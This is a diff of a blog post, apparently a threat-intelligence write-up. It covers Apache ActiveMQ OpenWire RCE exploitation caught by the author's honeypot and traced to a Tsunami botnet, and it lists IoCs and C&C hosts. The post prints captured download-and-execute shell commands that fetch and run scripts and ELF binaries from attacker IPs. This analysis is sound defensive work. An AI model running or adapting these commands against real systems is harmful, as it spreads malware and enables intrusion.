@@ -25,17 +25,17 @@ This service emulates real vulnerable ActiveMQ service and can trigger attacker 
 The Java OpenWire protocol marshaller can be vulnerable to Remote Code Execution. This vulnerability may allow a remote attacker with network access to either a Java-based OpenWire broker or client to run arbitrary shell commands. In fact this vulnerability used for malware Download & Execute attacks. This vulnerability commonly implemented in 2-3 stages. Let's look at this with an example of my testing infrastructure:
 
 **1) Vulnerability exploitation**
-![Attack Exploitation](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/attack_example.png)
+![Attack Exploitation](/assets/2023-12-10-tsunami-botnet-activemq-honeypot/attack_example.png)
 _Attack exploitation_
 
 Firstly attacker sends specific packet to Apache ActiveMQ service. This packet contains ExceptionResponse with Class `org.springframework.context.support.ClassPathXmlApplicationContext` and Message which contains XML payload url. 
-![Exploitation Packet](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/exploitation_packet_example.png)
+![Exploitation Packet](/assets/2023-12-10-tsunami-botnet-activemq-honeypot/exploitation_packet_example.png)
 _ClassPathXmlApplicationContext message_
 
 **2) XML payload downloading**
 
 Secondly vulnerable service loads XML payload which commonly contains RCE command.
-![XML Payload Loading](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/xml_loading_example.png)
+![XML Payload Loading](/assets/2023-12-10-tsunami-botnet-activemq-honeypot/xml_loading_example.png)
 _XML payload downloading_
 
 For example here you can see command `curl -s -o test.elf http://172[.]17.0[.]1:8000/test.elf; chmod +x ./test.elf; ./test.elf` that was executed by vulnerable Apache ActiveMQ service.
@@ -43,7 +43,7 @@ For example here you can see command `curl -s -o test.elf http://172[.]17.0[.]1:
 **3) Malware executable downloading (Download & Execute)**
 
 After succesful attack ActiveMQ service downloads malware executable and executes it. Commonly this is final exploitation step but there can be more different attack steps depending on the case.
-![Executable Loading](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/exec_loading_example.png)
+![Executable Loading](/assets/2023-12-10-tsunami-botnet-activemq-honeypot/exec_loading_example.png)
 _Executable downloading_
 
 This is example of attack scenario in my local testing infrastructure. Let's look at wild attack example.
@@ -53,46 +53,46 @@ This is example of attack scenario in my local testing infrastructure. Let's loo
 [activemq-honeypot](https://github.com/infokek/activemq-honeypot) is rust-written, created by me, fakely vulnerable Apache ActiveMQ service that extracts IoCs and attack chain components from real vulnerability exploitations. You can check repository of this service here: [https://github.com/infokek/activemq-honeypot](https://github.com/infokek/activemq-honeypot)
 
 Firstly I deployed [activemq-honeypot](https://github.com/infokek/activemq-honeypot) on my rented server and caught real attacker at 2023/12/19 19:21 UTC+3.
-![Real Attack Logs](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/real_attack_logs.png)
+![Real Attack Logs](/assets/2023-12-10-tsunami-botnet-activemq-honeypot/real_attack_logs.png)
 _activemq-honeypot output logs_
 Secondly honeypot got attack from [103[.]228.162[.]76](https://www.virustotal.com/gui/ip-address/103.228.162.76/detection) which identified as malicious on VirusTotal.
 
 [activemq-honeypot](https://github.com/infokek/activemq-honeypot) also creates json output with IoCs after succesful exploitation.
-![Real Attack Json](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/real_attack_json.png)
+![Real Attack Json](/assets/2023-12-10-tsunami-botnet-activemq-honeypot/real_attack_json.png)
 _activemq-honeypot output json_
 
 Malicious XML payload was hosted on `hxxp://188[.]166.177[.]88/wp-content/themes/twentynineteen/poc2.xml`. 
-![XML payload](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/xml_payload.png)
+![XML payload](/assets/2023-12-10-tsunami-botnet-activemq-honeypot/xml_payload.png)
 _Malicious XML payload_
 This url also identified as malicious on VirusTotal service. Honeypot also automatically extracted RCE command from XML payload:
 
 ```bash -c (wget -O pk.sh  hxxp://161[.]35.219[.]184/.s/1sh || curl -o pk.sh hxxp://161[.]35.219[.]184/.s/3sh || fetch  -o pk.sh hxxp://161[.]35.219[.]184/.s/3sh); chmod +x pk.sh; ./pk.sh; rm -rf pk.sh```
 
 This command downloads from [161[.]35.219[.]184](https://www.virustotal.com/gui/ip-address/161.35.219.184) malicious bash script [09aa65fc9e3b722f01a8ef65e4f5c352](https://www.virustotal.com/gui/file/09aa65fc9e3b722f01a8ef65e4f5c352/detection). 
-![sh sample](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/sample_sh.png)
+![sh sample](/assets/2023-12-10-tsunami-botnet-activemq-honeypot/sample_sh.png)
 _Malicious bash script_
 
 This malicious script contains `/dev/ttyN` UNIX system's mimicry. ELF32 executable that downloaded by this script [f895104d7e20dc6808c05164103d1357](https://www.virustotal.com/gui/file/f895104d7e20dc6808c05164103d1357/detection) attributed on VirusTotal as Tsunami Botnet.
 
-![Botnet DiE](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/sample_botnet_die.png)
+![Botnet DiE](/assets/2023-12-10-tsunami-botnet-activemq-honeypot/sample_botnet_die.png)
 _Tsunami Botnet executable in Detect It Easy_
 
 This sample packed with custom packer and detected by [Detect It Easy](https://github.com/horsicq/Detect-It-Easy) as UPX but can't be unpacked using standart UPX tool.
 
 Moreover packed sample contains unknown specific string `hitteru koto dake`. This mark can be used in static detections in future.
 
-![Botnet String](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/sample_botnet_string.png)
+![Botnet String](/assets/2023-12-10-tsunami-botnet-activemq-honeypot/sample_botnet_string.png)
 _Tsunami Botnet string in IDA_
 
 
 I analysed this script on Triage Sandbox: [https://tria.ge/231209-wyxalsbdh4/](https://tria.ge/231209-wyxalsbdh4/) to check malicious behaviour.
 This sample resolved C&C domain [p[.]deutschland-zahlung[.]eu](https://www.virustotal.com/gui/domain/p.deutschland-zahlung.eu) and contacted with C&C IP address [138[.]197.78[.]18](https://www.virustotal.com/gui/ip-address/138.197.78.18).
-![Tsunami Botnet Traffic](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/tsunami_botnet_traffic2.png)
+![Tsunami Botnet Traffic](/assets/2023-12-10-tsunami-botnet-activemq-honeypot/tsunami_botnet_traffic2.png)
 _Tsunami Botnet DNS resolve_
 
 As we can see this botnet contains Telnet module which was used for C&C communications.
 
-![Tsunami Botnet Traffic](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/tsunami_botnet_traffic.png)
+![Tsunami Botnet Traffic](/assets/2023-12-10-tsunami-botnet-activemq-honeypot/tsunami_botnet_traffic.png)
 _Tsunami Botnet C&C communication_
 
 ## Conclusion
